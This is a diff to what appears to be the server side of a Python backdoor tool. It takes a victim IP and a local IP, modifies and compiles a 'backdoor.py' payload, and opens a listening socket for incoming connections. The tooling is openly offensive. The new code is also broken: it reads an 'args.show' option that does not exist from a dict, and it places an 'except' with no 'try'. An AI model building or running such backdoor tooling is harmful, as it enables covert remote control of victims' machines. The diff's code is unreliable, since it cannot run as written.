@@ -17,7 +17,7 @@ ap = argparse.ArgumentParser()
 ap.add_argument("-rh", "--rhost", required=True, help="Victim ip")
 ap.add_argument("-lh", "--lhost", required=True, help="Your local ip")
 ap.add_argument("-p", "--port", required=True, help="Port")
-ap.add_argument("-c", "--compile", required=False, help="Compiler payload file, example: python server.py -c y")
+ap.add_argument("-c", "--compile", action="store_true", required=False, help="Compiler payload file")
 args = vars(ap.parse_args())
 
 if args['lhost']:
@@ -169,24 +169,14 @@ def target_reqs():
 
 
 modify_backdoor()
-if args['compile']:
-    if str(args['compile']) == 'y':
-        try:
-            py_compile.compile("backdoor.py")
-            print(termcolor.colored("[+] Finished compiling", 'green'))
-            print(termcolor.colored("[+] goto __pycache__ folder", 'green'))
-        except py_compile.PyCompileError:
-            print(termcolor.colored("[+] Error: can not compile :-(",'red'))
-    elif str(args['compile']) == 'n':
-        pass
-    else:
-        print(termcolor.colored("[-] Error expected one argument", 'red'))
-        usernput = input(termcolor.colored("Do you want to exit y/n: "))
-        if usernput == 'y':
-            exit()
-        elif usernput == 'n':
-            os.system('clear')
-            pass
+
+if args.show == True:
+    py_compile.compile("backdoor.py")
+    print(termcolor.colored("[+] Finished compiling", 'green'))
+    print(termcolor.colored("[+] goto __pycache__ folder", 'green'))
+    except py_compile.PyCompileError:
+        print(termcolor.colored("[+] Error: can not compile :-(",'red'))
+
 skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 skt.bind((RHOST, PORT))
 print(termcolor.colored("[+] Listening for incoming requests", "green"))
